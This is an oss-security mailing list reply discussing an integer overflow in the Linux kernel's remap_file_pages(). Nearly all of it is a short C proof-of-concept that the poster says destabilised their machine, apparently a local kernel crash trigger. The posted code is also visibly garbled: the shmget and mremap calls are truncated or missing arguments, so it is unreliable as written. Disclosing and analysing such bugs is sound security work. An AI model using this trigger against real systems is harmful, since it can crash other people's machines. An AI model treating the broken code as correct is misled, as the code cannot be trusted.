  oss-security - Re: kernel: avoid pgoff overflow in remap_file_pages            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Tue, 12 Oct From: akiphie <akiphie@...abit.com> To: oss-security@...ts.openwall.com Subject: Re: kernel: avoid pgoff overflow in remap_file_pages  On Tuesday 12 October Eugene Teo wrote: > Thomas Pollet reported an integer overflow issue in remap_file_pages(). > While we are able to reproduce the issue, we are unable to find a > security impact. If your views differ, do let us know.  This made my computer very sad :(  #include <sys/mman.h> #include <unistd.h> #include <sys/ipc.h> #include <sys/shm.h>                                                                                                                                                                                      int main(int argc, char **argv)                                                                                                                                                      {                                                                                                                                                                                            int x = shmget(IPC_PRIVATE, 1, IPC_CREAT | IPC_EXCL |                                                                                                                         void *mem = shmat(x, NULL, 0);                                                                                                                                                       mremap(mem, MREMAP_MAYMOVE | MREMAP_FIXED, 0x0);                                                                                                                     remap_file_pages((void *) 0xfff, ~0UL, 0, -(~0UL >> 12), 0);                                                                                                                         return 0;                                                                                                                                                                    }                                                                                                                                                                                     -- cnu   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      